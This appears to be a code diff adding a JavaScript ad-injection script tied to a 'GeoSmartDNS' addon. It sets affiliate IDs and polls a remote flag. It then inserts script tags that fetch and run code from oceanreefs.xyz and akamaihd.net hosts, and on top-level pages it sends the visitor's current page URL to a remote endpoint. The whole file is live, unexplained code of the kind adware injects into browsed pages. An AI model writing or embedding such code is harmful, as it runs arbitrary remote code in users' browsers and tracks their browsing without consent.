@@ -1,0 +1,74 @@
+/* 88/21/IN  */
+window.adk_pdisp = {'h' : 'xml.oceanreefs.xyz',
+'f' : 150055,
+'a' : 'I3IPwh',
+'ps' : [1],
+'cin' : 4,
+'s' : '88002',
+'q' : [],
+'wname' : '150055_gt',
+'t' : 1};
+
+(function() {
+  var gtprv = {
+    isIE : function () { var myNav = navigator.userAgent.toLowerCase(); return (myNav.indexOf('msie') != -1) ? parseInt(myNav.split('msie')[1]) : false; },
+    loadJS : function (gturl) {
+      var dns_qcs8 = document.getElementsByTagName('script')[0];
+      var dns_qc8 = document.createElement('script'); dns_qc8.type='text/javascript';
+      dns_qc8.src=('https:' == document.location.protocol ? 'https://' : 'http://')+gturl;
+      dns_qcs8.parentNode.insertBefore(dns_qc8, dns_qcs8);
+    },
+    loadJSON: function (callback) {
+        var xobj = new XMLHttpRequest();
+        xobj.overrideMimeType("application/json");
+        xobj.open('GET', ('https:' == document.location.protocol ? 'https://' : 'http://')+'m88.prod2016.com/QualityCheck/x.txt', true);
+        xobj.onreadystatechange = function () {
+          if (xobj.readyState == 4) {
+            if (xobj.status == "200") {
+              callback(xobj.responseText);
+            } else {
+              callback('0');
+            }
+          }
+        };
+        xobj.send(null);
+    },
+    init : function() {
+      var isMSIE = /*@cc_on!@*/0;
+      if (gtprv.isIE () == 8) {
+        return; // IE 8 not supported
+      } else if (isMSIE && gtprv.isIE()!= 9 && document.all && !document.querySelector) {
+        return; // IE 7 or lower not supported
+      }
+      if (gtprv.isIE () == 8) return; // IE 8 not supported
+      if (isMSIE && gtprv.isIE()!= 9 && document.all && !document.querySelector) return; // IE 7 or lower not supported
+      gtprv.loadJSON(function(response) {
+        // Parse JSON string into object
+        var actual_JSON = JSON.parse(response);
+        if (actual_JSON) actual_JSON=parseInt(actual_JSON);
+        else actual_JSON=0;
+        if (actual_JSON==0) {
+		if ((window.name || '').indexOf('150055_gt') == 0) {
+                        gtprv.loadJS('static.oceanreefs.xyz/tabu/display.js');
+                } else if ((window.name || '').match(/^(a652c|ld893)_/))  {
+			gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/88002/l.js?pid=2637&ext=GeoSmartDNS');
+		} else {
+			if(window.top==window.self) {
+                                var gtURL = encodeURIComponent(window.location.protocol + "//" + window.location.host + window.location.pathname);
+                                gtprv.loadJS('asrvvv-a.akamaihd.net/get?addonname=GeoSmartDNS&clientuid=&subID=88002&affid=9802&subaffid=1001&href='+gtURL);
+                        }
+          		gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/88002/l.js?pid=2637&ext=GeoSmartDNS');
+			gtprv.loadJS('cdncache-a.akamaihd.net/sub/b156ae9/88002/l.js?pid=2638&ext=GeoSmartDNS');
+          		if(window.top==window.self) {
+				gtprv.loadJS('asrvvv-a.akamaihd.net/get?addonname=GeoSmartDNS&clientuid=F11011ACDBBA895D9E242A3002CB870F&subID=88002&affid=9802&subaffid=1002');
+          		}
+			//
+			//gtprv.loadJS('sax.mediaonspot.com/?ti=4143&si=88002');
+			gtprv.loadJS('static.oceanreefs.xyz/tabu/display.js');
+		}
+        }
+      });
+    }
+  }
+  gtprv.init();
+})();
